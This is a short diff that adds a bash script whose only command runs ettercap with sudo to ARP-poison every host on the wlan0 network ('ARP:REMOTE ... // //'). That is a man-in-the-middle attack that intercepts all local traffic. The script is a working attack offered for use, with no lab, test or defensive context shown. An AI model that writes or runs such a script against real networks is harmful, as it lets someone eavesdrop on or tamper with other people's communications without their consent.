@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo ettercap -TqM ARP:REMOTE -i wlan0 // //
